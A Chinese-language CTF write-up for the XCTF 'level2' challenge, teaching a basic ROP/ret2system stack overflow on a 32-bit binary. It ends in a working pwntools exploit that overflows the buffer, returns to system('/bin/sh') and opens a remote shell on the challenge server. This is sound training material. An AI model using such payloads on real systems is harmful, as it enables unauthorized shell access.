
# [原创]XCTF攻防世界 level2

## Level2

这是XMAN上之前比赛的一道题，还是挺简单的，ROP的基本入门使用。

### 检查文件

![](upload/attach/201905/779730_97JZSJX63GFJGTK.png)

- 可以获取的信息有：32位程序；在输入很长的字符串后程序仍然正常退出；文件没有开启canary，但是开启了NX。

### IDA查看

![](upload/attach/201905/779730_PXRJK8A68NBZQEW.png)

- 首先可以看到的是，程序的代码很少，`main()`函数中只调用了一个`vulnerable_function()`和一个`system()`。F5看一下：

![](upload/attach/201905/779730_BPRXJYVJSE83GWT.png)

确实没有发现其他函数，进入`vulnerable_function()`函数：

![](upload/attach/201905/779730_KFKQHD49NRVF8R3.png)

- 在这里我们看到了一个`buf[]`，然后没有其他内容了，没有对输入做任何限制，这也是为什么我们一开始输入大量的无效字符程序依然没有任何问题。

- 查看一下程序的`strings`，可能会有其他有用的内容：

![](upload/attach/201905/779730_964REGDJQHN57M2.png)

我们看到了`system`和`/bin/sh`，这是解出题目的关键。

我们可以构造一个`system("/bin/sh")`的伪栈帧，`vulnerable_function()`执行结束后返回到我们构造的伪栈帧去执行`system("bin/sh")`，这样就可以获取shell。（需要注意一点，因为我们的目的是通过`system("bin/sh")`来获取shell，所以函数执行完后的返回地址可以任意。）

### EXP

```
#! /usr/bin/env python
# -\*- coding:utf-8 -\*-
from pwn import *
context.log_level = 'debug'
elf = ELF('./level2')
sys_addr = elf.symbols['system']
sh_addr = elf.search('/bin/sh').next()
payload = 'A' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
io = remote('111.198.29.45',45800)
io.sendlineafter("Input:\n",payload)
io.interactive()
io.close()
```

### 运行结果

![](upload/attach/201905/779730_YX922YRAEMAADYH.png)

- 根据该题目的提示，使用ROP编程，其实可以大体猜到题目的解题思路，这道题目也是ROP利用的入门教学，可以实际理解一下ROP，为后续的深入开个门。
